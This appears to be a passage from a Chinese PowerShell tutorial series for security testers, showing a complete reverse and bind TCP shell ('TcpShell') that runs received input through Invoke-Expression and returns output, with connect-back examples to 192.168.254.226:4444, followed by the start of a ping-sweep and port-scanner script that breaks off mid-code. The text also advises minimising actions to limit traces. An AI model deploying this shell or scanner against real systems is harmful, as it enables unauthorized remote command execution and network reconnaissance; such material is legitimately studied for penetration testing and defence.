    .PARAMETER Port
    port参数
    ​
    .EXAMPLE
    反向连接模式
    PS > TcpShell -Reverse -IPAddress 192.168.254.226 -Port 4444
    ​
    .EXAMPLE
    正向连接模式
    PS > TcpShell -Bind -Port 4444
    ​
    .EXAMPLE
    IPV6地址连接
    PS > TcpShell -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
    #>  
        # 参数绑定
        [CmdletBinding(DefaultParameterSetName="reverse")] Param(
    ​
            [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
            [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
            [String]
            $IPAddress,
    ​
            [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
            [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
            [Int]
            $Port,
    ​
            [Parameter(ParameterSetName="reverse")]
            [Switch]
            $Reverse,
    ​
            [Parameter(ParameterSetName="bind")]
            [Switch]
            $Bind
    ​
        )
    ​
        try 
        {
            # 如果检测到Reverse参数,开启反向连接模式
            if ($Reverse)
            {
                $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
            }
    ​
            # 使用正向的连接方式, 绑定本地端口, 用于正向连接
            if ($Bind)
            {
                # Tcp连接监听服务端
                $server = [System.Net.Sockets.TcpListener]$Port
                # Tcp连接开始
                $server.start()    
                # Tcp开始接受连接
                $client = $server.AcceptTcpClient()
            } 
    ​
            $stream = $client.GetStream()
            [byte[]]$bytes = 0..65535|%{0}
    ​
            # 返回给连接的用户一个简单的介绍,目前是使用什么的用户来运行powershell的, 并打印powershell的banner信息
            $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + 
    ​
    "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
            $stream.Write($sendbytes,0,$sendbytes.Length)
    ​
            # 展示一个交互式的powershell界面
            $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
            $stream.Write($sendbytes,0,$sendbytes.Length)
    ​
            # while循环用于死循环,不断开连接
            while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
            {
                # 指定EncodedText为Ascii对象, 用于我们后面的调用来编码
                $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
                # 获取用户的输入
                $data = $EncodedText.GetString($bytes,0, $i)
                try
                {
                    # 调用Invoke-Expression来执行我们获取到的命令, 并打印获得的结果
                    # Invoke-Expression会把所有的传入命令当作ps代码执行
                    $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
                }
                catch
                {
                    # 错误追踪
                    Write-Warning "Execution of command error." 
                    Write-Error $_
                }
                $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
                # 错误打印
                $x = ($error[0] | Out-String)
                $error.clear()
                $sendback2 = $sendback2 + $x
    ​
                # 返回结果
                $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
                $stream.Write($sendbyte,0,$sendbyte.Length)
                $stream.Flush()  
            }
            # 关闭连接
            $client.Close()
            if ($server)
            {
                $server.Stop()
            }
        }
        catch
        {
            # 获取错误信息,并打印
            Write-Warning "Something went wrong!." 
            Write-Error $_
        }
    }
简单的分析在注释已经提到, 其中`Invoke-Expression -Command`后接的代码都会被看作powershell来执行,
我们来看看正向连接的执行效果, 我们在172.16.50.196机器上执行下面的代码
    PS C:Usersrootclay> cd .Desktoppowershell
    PS C:UsersrootclayDesktoppowershell> . .Tcp-Shell.ps1
    PS C:UsersrootclayDesktoppowershell> TcpShell -bind -port 4444
连接这台机器, 结果如下:
反向类似执行即可
大家可以看到这个脚本的最开始有一大块注释，这些注释无疑是增强脚本可读性的关键，对于一个脚本的功能和用法都有清晰的讲解，那么我们来看看如何写这些注释呢。
     TcpShell -Reverse -IPAddress 192.168.254.226 -Port 4444
    ​
    #>  
最后我们使用Get-Help命令就能看到我们编辑的这些注释内容：
# powershell(5)-端口扫描与服务爆破
## 端口扫描
这里我们就开始了我们的端口扫描器的构建, 这里很多朋友肯定会说,
端口扫描不是有很多已经很成熟的脚本了么为什么还要去学习呢？那么我们首先想一想目前的一些优秀的端口扫描都是Python或者Go语言等进行编写的,
对于我们安全测试人员来说并不是最佳选择。因为对于Windows系统Python之类的环境并不是每一台电脑都有,
但Powershell不同我们不需要进行过多的操作即可进行丰富的操作, 这也是我们作为专业安全人员的基本素养: 尽可能进行少的操作,
因为你无法删除你所有的行踪, 物质守恒定律—没有人能确保自己不留任何痕迹, 那么越少的操作无疑是我们需要思考的。 端口扫描脚本已经直接放在了下面,
同样大部分的注释等已经写的很清晰, 本脚本涉及到的几个点：
  1. 脚本参数的问题的解决, 可以看到我们的参数获取用了CmdletBinding的方法，这样我们可以设置参数的形式就有很多了, 比如我们需要一个参数是否可选，和参数的位置等
  2. 主机存活检测使用Ping来检测(ICMP)
  3. 端口扫描调用.NET的Socket来进行端口连接，如果连接建立代表端口连接成功
    function PortScan {
     PortScan -StartAddress 172.16.50.1 -EndAddress 172.16.50.254
    ​
    .EXAMPLE
    PS > PortScan -StartAddress 172.16.50.1 -EndAddress 172.16.50.254 -GetHost
    ​
    .EXAMPLE
    PS > PortScan -StartAddress 172.16.50.1 -EndAddress 172.16.50.254 -GetHost -ScanPort
    ​
    .EXAMPLE
    PS > PortScan -StartAddress 172.16.50.1 -EndAddress 172.16.50.254 -GetHost -ScanPort -TimeOut 500
    ​
    .EXAMPLE
    PS > PortScan -StartAddress 172.16.50.1 -EndAddress 172.16.50.254 -GetHost -ScanPort -Port 80
    ​
    #>
        [CmdletBinding()] Param(
            [parameter(Mandatory = $true, Position = 0)]
            [ValidatePattern("bd{1,3}.d{1,3}.d{1,3}.d{1,3}b")]
            [string]
            $StartAddress,
    ​
            [parameter(Mandatory = $true, Position = 1)]
            [ValidatePattern("bd{1,3}.d{1,3}.d{1,3}.d{1,3}b")]
            [string]
            $EndAddress,
            [switch]
            $GetHost,
    ​
            [switch]
            $ScanPort,
    ​
            [int[]]
            $Ports = @
    ​
    (21,22,23,25,53,80,110,139,143,389,443,445,465,873,993,995,1080,1086,1723,1433,1521,2375,3128,3306,3389,3690,5432,5800,5900,6379,7001,7002,7778
    ​
    ,8000,8001,8080,8081,8089,8161,8888,9000,9001,9060,9200,9300,9080,9090,9999,10051,11211,27017,28017,50030),
            [int]
            $TimeOut = 100
        )  
        Begin {
            # 开始之前先调用Ping组件
            $ping = New-Object System.Net.Networkinformation.Ping
        }
        Process {
            # 四层循环获取解析IP地址
            foreach($a in ($StartAddress.Split(".")[0]..$EndAddress.Split(".")[0])) {
                foreach($b in ($StartAddress.Split(".")[1]..$EndAddress.Split(".")[1])) {
                foreach($c in ($StartAddress.Split(".")[2]..$EndAddress.Split(".")[2])) {
                    foreach($d in ($StartAddress.Split(".")[3]..$EndAddress.Split(".")[3])) {
                        # write-progress用于在shell界面显示一个进度条
                        write-progress -activity PingSweep -status "$a.$b.$c.$d" -percentcomplete (($d/($EndAddress.Split(".")[3])) * 100)
                        # 通过Ping命令发送ICMP包探测主机是否存活
                        $pingStatus = $ping.Send("$a.$b.$c.$d",$TimeOut)
                        if($pingStatus.Status -eq "Success") {
                            if($GetHost) {
                                # 本分支主要解决主机名的问题
                                # write-progress用于在shell界面显示一个进度条
                                write-progress -activity GetHost -status "$a.$b.$c.$d" -percentcomplete (($d/($EndAddress.Split(".")[3])) * 100) -    ​
    Id 1
                                # 获取主机名
                                $getHostEntry = [Net.DNS]::BeginGetHostEntry($pingStatus.Address, $null, $null)
                            }
                            if($ScanPort) {
                                # 定义一个开放的端口数组, 存储开放的端口
                                $openPorts = @()
                                for($i = 1; $i -le $ports.Count;$i++) {
                                    $port = $Ports[($i-1)]
                                    # write-progress用于在shell界面显示一个进度条
                                    write-progress -activity PortScan -status "$a.$b.$c.$d" -percentcomplete (($i/($Ports.Count)) * 100) -Id 2
                                    # 定义一个Tcp的客户端
                                    $client = New-Object System.Net.Sockets.TcpClient
                                    # 开始连接
                                    $beginConnect = $client.BeginConnect($pingStatus.Address,$port,$null,$null)
                                    if($client.Connected) {
                                        # 加入开放的端口
                                        $openPorts += $port
                                    } else {
                                    # 等待, 这里用于网络延迟, 防止因为网络原因而没有判断到端口的开放而错失很多机会
                                        Start-Sleep -Milli $TimeOut
                                        if($client.Connected) {
                                            $openPorts += $port
                                        }
                                    }
                                    $client.Close()
                                }
                            }
                            if($GetHost) {
                                # 获取主机名
                                $hostName = ([Net.DNS]::EndGetHostEntry([IAsyncResult]$getHostEntry)).HostName
                            }
                            # 返回对象-哈希表
                            New-Object PSObject -Property @{
                            IPAddress = "$a.$b.$c.$d";
                            HostName = $hostName;
                            Ports = $openPorts